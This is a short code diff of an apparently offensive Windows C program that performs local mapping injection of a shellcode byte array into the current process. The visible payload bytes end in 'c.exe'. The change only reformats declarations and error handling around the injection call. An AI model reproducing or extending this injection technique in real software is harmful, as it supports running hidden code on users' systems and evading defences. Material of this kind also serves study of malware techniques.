@@ -32,14 +32,16 @@ int main()
 	0x63,0x2e,0x65,0x78,0x65,0x00
 	};
 
-	PVOID  pAddress = NULL;
-	SIZE_T Shellsize = sizeof(Shellcode);
-	HANDLE hThread = NULL, hProcess = GetCurrentProcess();
+	PVOID	pAddress	= NULL;
+	SIZE_T	Shellsize	= sizeof(Shellcode);
+	HANDLE	hThread		= NULL, 
+			hProcess	= GetCurrentProcess();
 
 
 	INFO("Injecting Target Process ... ");
-	if (!local_map_inject(hProcess, hThread, Shellcode, Shellsize, &pAddress)) { // Stop forgetting the pointer dumbo
-		WARN("Could Not Perform Mapping Injection! Reason: %lu", GetLastError());
+	if (!local_map_inject(hProcess, hThread, Shellcode, Shellsize, &pAddress)) 
+	{ 
+		PRINT_ERROR("LocalMapInject");
 		return 1;
 	}
 	OKAY("Successfully Completed Local Mapping Injection!");
